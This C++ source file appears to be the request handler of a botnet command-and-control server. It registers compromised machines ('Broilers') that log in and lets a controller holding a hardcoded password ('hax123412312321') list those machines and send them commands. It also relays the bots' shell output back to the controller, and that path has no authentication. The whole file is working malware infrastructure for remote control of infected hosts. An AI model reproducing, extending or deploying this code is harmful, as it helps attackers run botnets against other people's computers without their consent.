
#include"requetshandel.h"
#include "Protocol.h"
#include <sstream>
#include <sys/socket.h>
#include <string.h>

void Base::find_url() {
//    map<string,string>::iterator ite;
////    for(ite=dt.begin();ite!=dt.end();ite++)
////    {
////        cout<<ite->first<<"  "<<ite->second<<endl;
////    }
    cout << "find" << endl;

    if (dt["url"] == "login") {
        login();
    } else if (dt["url"] == "cout_info") {
        cout_info();
    }
    else if (dt["url"] == "to") {
        to_Broiler();
    }
    else if(dt["url"]=="shellreq")
    {
        shellreq();
    }


}
bool Base::Controller_Verify(string hax)
{
    if(hax.empty())//密码为空不通过
    {
        return false;
    }
    else
    {
        if(hax=="hax123412312321")
        {
            return true;
        }
        else
        {
            return false;
        }
    }
}
void Base::to_Broiler(){
    if(Controller_Verify(dt["hax"])) //密码验证通过才执行
    {
        stringstream stream;
        stream << coon_info.port;
        string key = coon_info.ip + ':' + stream.str();
        int val = coon_info.socket;
        data->Controller_add(key, val);
        cout << "进入 to" << endl;
        string ip = dt["to"];
        int coon = data->get_Broiler(ip);

        dt["Publisher"] = coon_info.ip + ':' + stream.str();

        string test = CProtocol::structure(dt);
        cout << "coon：" << coon << endl;
        cout << "test" << test << endl;
        send(coon, test.c_str(), strlen(test.c_str()), 0);
        cout << strerror(errno) << endl; //打印一下错误信息
    }
    else
    {

        return_eero("hax eero");
    }
}

void Base::login() {
    stringstream stream;
    stream << coon_info.port;
    string key=coon_info.ip + ':' + stream.str();
    int val=coon_info.socket;
    data->Broiler_add(key,val);
    cout << "login" << "::"<<coon_info.ip + ':' + stream.str()<<"coon"<<coon_info.socket<<endl;
}

void Base::Base_init(int coon, string ip, int port, string req) {
     data=Cdata::get_Cdata();
    coon_info.ip = ip;
    coon_info.socket = coon;
    coon_info.port = port;
    dt = CProtocol::analysis(req);
    find_url();

}

void Base::cout_info() {
    if(Controller_Verify(dt["hax"]))
    {
        string Broiler = data->return_Broiler();
        map<string, string> map_req;
        map_req["body"] = Broiler;
        string req = CProtocol::structure(map_req);
        send(coon_info.socket, req.c_str(), strlen(req.c_str()), 0);
    }
    else
    {
        return_eero("hax eero");
    }
}
void Base::shellreq()
{
    string body=dt["body"];
    string ip=dt["to"];
    cout<<"打印body"<<body<<endl;
    int coon=data->get_Controller(ip);
    string req=CProtocol::structure(dt);
    send(coon,req.c_str(),strlen(req.c_str()),0);
}
void Base::return_eero(string eero)
{
    map<string,string> req_eero;
    req_eero["body"]=eero;
    int coon=coon_info.socket;
    string req=CProtocol::structure(req_eero);
    send(coon,req.c_str(),strlen(req.c_str()),0);
}
